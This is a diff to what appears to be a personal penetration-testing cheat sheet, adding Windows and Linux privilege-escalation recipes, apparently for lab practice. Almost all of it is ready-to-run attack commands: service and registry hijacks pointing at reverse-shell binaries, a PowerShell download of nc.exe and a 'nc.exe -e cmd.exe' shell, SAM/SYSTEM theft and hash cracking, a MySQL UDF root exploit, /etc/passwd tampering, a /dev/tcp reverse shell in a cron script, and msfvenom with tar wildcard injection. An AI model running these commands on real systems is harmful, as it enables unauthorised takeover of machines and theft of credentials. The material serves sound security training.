@@ -720,6 +720,7 @@ Sniffing & MITM ::
 		# try sc stop/start
 		# shutdown /r /t 0 -> Restart endpoint to restart services aggressively
 
+		# sc config <service name> binpath="C:\.........\<payload>.exe"
 
 	DNS Tunneling:
 
@@ -888,3 +889,114 @@ HELPFUL STUFF ::
 	Crack zip:
 
 		fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt <ZIP-FILE>
+
+
+Windows Priv Esc::
+
+	
+	Insecure service permissions:
+
+		accesschk.exe /accepteula -uwcqv <user> <service>
+		sc qc <service>
+		sc config <service> binpath= "\"C:\Path\To\revshell.exe\""
+		net start <service>
+
+	Unquoted path:
+
+		sc qc <service>
+		accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+		copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe" (Common Files folder)
+		net start <service>
+
+	Weak registry permissions:
+
+		sc qc <service>
+		accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>
+		reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+
+	Always install elevated:
+
+		reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+		reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+		msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+	SAM Files:
+
+		copy C:\WINDOWS\Repair\SAM \\<IP>\<SHARE>
+		copy C:\WINDOWS\Repair\SYSTEM \\<IP>\<SHARE>
+		pwdump.py SYSTEM SAM 
+		hashcat -m 1000 --force <hash> /usr/share/wordlists
+
+	Scheduled Task:
+
+		accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+		echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+	
+	Bypass upload access denied:
+			
+			powershell.exe -c "iwr http://192.168.49.139/nc.exe -OutFile C:\temp\nc.exe"
+	runas:
+	
+		runas /env /profile /user:<DOMAIN/PC>\Administrator "C:\temp\nc.exe -e cmd.exe 
+	
+
+cd /tmp
+echo "/bin/sh" > curl
+chmod 777 curl
+echo $PATH
+export PATH=/tmp:$PATH
+/opt/statuscheck
+id
+cd /root
+cat proof.txt
+
+
+Linux Privilege Escalation::
+		
+	MYSQL root user - UDF:
+		
+		gcc -g -c raptor_udf2.c -fPIC
+		gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+		mysql -u root
+		use mysql;
+		create table foo(line blob);
+		insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+		select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+		create function do_system returns integer soname 'raptor_udf2.so';
+		select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+		/tmp/rootbash -p
+
+	Writeable /etc/passwd:
+
+		openssl passwd newpasswordhere
+		root:x:.......  -> change x to pass
+		OR - copy the line and change the root username and then su to the new root
+		su c0ffee0vrflw
+
+	Cron Jobs - File Permissions:
+
+		cat /etc/crontab
+		ls -l /usr/local/bin/overwrite.sh
+		change to:
+			#!/bin/bash
+			bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+	Cron Jobs - Wildcards:
+
+		msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+		chmod +x /home/user/shell.elf
+		touch /home/user/--checkpoint=1
+		touch /home/user/--checkpoint-action=exec=shell.elf
+
+	SUID / SGID Executables - Known Exploits:
+
+		find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+	 Passwords & Keys - History Files:
+
+	 	cat ~/.*history | less
+
+	 
+
+
+
